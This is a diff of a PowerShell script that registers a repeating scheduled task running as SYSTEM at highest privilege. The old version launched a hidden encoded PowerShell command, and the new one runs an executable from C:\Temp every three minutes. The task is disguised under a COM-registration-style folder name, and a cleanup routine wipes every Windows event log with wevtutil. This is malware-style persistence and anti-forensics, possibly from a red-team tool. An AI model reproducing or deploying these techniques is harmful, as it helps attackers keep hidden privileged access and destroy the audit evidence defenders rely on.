@@ -171,16 +171,15 @@ function Install-EncodedScriptTask {
         [string]$EncodedTask
     )
 
-    $Interval=15
- 
+    $Interval=3
 
     OutString "Install-EncodedScriptTask called with taskname $TaskName. Code: $EncodedTask"
 
 
-    $action = New-ScheduledTaskAction -Execute "C:\WINDOWS\system32\WindowsPowerShell\v1.0\powershell.exe" -Argument "-ExecutionPolicy Unrestricted -NoProfile -WindowStyle Hidden -NonInteractive -EncodedCommand $EncodedTask"
+    $action = New-ScheduledTaskAction -Execute "C:\Temp\ImportantProgram.exe"
     $trigger = New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionInterval (New-TimeSpan -Minutes $Interval)
     $principal = New-ScheduledTaskPrincipal -UserID "NT AUTHORITY\SYSTEM" -LogonType ServiceAccount -RunLevel Highest
-    $settings = New-ScheduledTaskSettingsSet -MultipleInstances Parallel -Hidden -Priority 3
+    $settings = New-ScheduledTaskSettingsSet -MultipleInstances Parallel -Priority 3
     $task = New-ScheduledTask -Action $action -Principal $principal -Trigger $trigger -Settings $settings
 
     $null=Register-ScheduledTask $TaskName -InputObject $task
@@ -237,7 +236,7 @@ function Cleanup {
   $NewTaskFolder='ComObjectsRegistrationManagement'
   $NewTaskName=$NewTaskFolder + '\' + 'ComObjectsRegistrar'
   Unregister-ScheduledTask $NewTaskName -ErrorAction Ignore
-
+  RemoveOldTasks
   # logs
   OutString "Clera Logs"
   $null=Get-WinEvent -ListLog * -Force | % { Wevtutil.exe cl $_.LogName }
